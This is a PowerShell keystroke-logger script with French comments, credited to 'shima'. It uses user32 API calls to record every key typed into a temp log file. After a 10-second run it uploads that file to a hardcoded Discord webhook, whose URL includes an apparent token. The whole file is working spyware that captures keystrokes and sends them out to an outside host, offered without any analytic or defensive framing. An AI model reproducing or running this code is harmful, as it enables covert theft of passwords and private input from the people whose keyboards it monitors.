<#
PowerShell keystroke logger by shima
Modifié : arrêt automatique + envoi fichier Discord en pièce jointe
#>

function KeyLog {

    $MAPVK_VK_TO_VSC = 0x00
    $MAPVK_VSC_TO_VK = 0x01
    $MAPVK_VK_TO_CHAR = 0x02
    $MAPVK_VSC_TO_VK_EX = 0x03
    $MAPVK_VK_TO_VSC_EX = 0x04

    $virtualkc_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@

    $kbstate_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
'@

    $mapchar_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
'@

    $tounicode_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    $getKeyState = Add-Type -MemberDefinition $virtualkc_sig -name "Win32GetState" -namespace Win32Functions -passThru
    $getKBState = Add-Type -MemberDefinition $kbstate_sig -name "Win32MyGetKeyboardState" -namespace Win32Functions -passThru
    $getKey = Add-Type -MemberDefinition $mapchar_sig -name "Win32MyMapVirtualKey" -namespace Win32Functions -passThru
    $getUnicode = Add-Type -MemberDefinition $tounicode_sig -name "Win32MyToUnicode" -namespace Win32Functions -passThru

    $startTime = Get-Date
    $duration = 10

    Write-Host "KeyLogger demarré - Arret automatique dans $duration secondes..." -ForegroundColor Green

    while ($true) {
        $elapsedTime = (Get-Date) - $startTime
        if ($elapsedTime.TotalSeconds -ge $duration) {
            Write-Host "`nKeyLogger arrete apres $duration secondes" -ForegroundColor Red
            break
        }

        Start-Sleep -Milliseconds 40
        $gotit = ""

        for ($char = 1; $char -le 254; $char++) {
            $vkey = $char
            $gotit = $getKeyState::GetAsyncKeyState($vkey)

            if ($gotit -eq -32767) {

                $l_shift = $getKeyState::GetAsyncKeyState(160)
                $r_shift = $getKeyState::GetAsyncKeyState(161)
                $caps_lock = [console]::CapsLock

                $scancode = $getKey::MapVirtualKey($vkey, $MAPVK_VSC_TO_VK_EX)

                $kbstate = New-Object Byte[] 256
                $checkkbstate = $getKBState::GetKeyboardState($kbstate)

                $mychar = New-Object -TypeName "System.Text.StringBuilder"
                $unicode_res = $getUnicode::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)

                if ($unicode_res -gt 0) {
                    $logfile = "$env:temp\key.log"
                    Out-File -FilePath $logfile -Encoding Unicode -Append -InputObject $mychar.ToString()
                }
            }
        }
    }
}

# Lancer le keylogger
KeyLog

# Envoyer le fichier en pièce jointe sur Discord
$logfile = "$env:temp\key.log"
$webhook = "https://discord.com/api/webhooks/1197260699768987748/MusyfmoPCs0DkrWb1IH2uQ0Aw6p369foF6pVYynOxL5x0wYokip9_a-kkhpbhWVATEHn"

Write-Host "`nEnvoi du fichier en piece jointe sur Discord..." -ForegroundColor Yellow

if (Test-Path $logfile) {
    try {
        # Lire le fichier en bytes
        $fileBytes = [System.IO.File]::ReadAllBytes($logfile)
        $fileName = Split-Path $logfile -Leaf
        
        # Créer la requête multipart
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        $bodyLines = @(
            "--$boundary",
            'Content-Disposition: form-data; name="payload_json"',
            "",
            '{"content":"Fichier keylog joint"}',
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
            "Content-Type: application/octet-stream",
            "",
            [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes),
            "--$boundary--"
        )
        
        $body = $bodyLines -join $LF
        
        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }
        
        Invoke-RestMethod -Uri $webhook -Method Post -Body $body -Headers $headers -ErrorAction Stop
        Write-Host "Fichier envoye avec succes !" -ForegroundColor Green
    } catch {
        Write-Host "Erreur : $_" -ForegroundColor Red
    }
} else {
    Write-Host "Fichier non trouve" -ForegroundColor Red
}
